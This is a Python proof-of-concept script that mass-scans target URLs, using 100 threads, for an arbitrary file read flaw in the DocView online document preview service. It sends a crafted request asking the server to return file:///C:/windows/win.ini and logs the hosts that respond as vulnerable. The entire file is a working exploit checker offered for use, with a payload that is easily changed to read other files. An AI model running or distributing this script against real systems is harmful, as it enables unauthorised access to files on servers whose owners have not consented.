import requests,sys,argparse,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description='DocView在线文档预览任意文件读取')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/view/qJvqhFt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi"
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
        js1 = json.loads(res.text)
        code_value = js1.get("code")
        if res.status_code == 200 and code_value == 1:
            print(f"[+]存在漏洞：{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
        else:
            return False
    except Exception as e:
        return False

if __name__ == '__main__':
    main()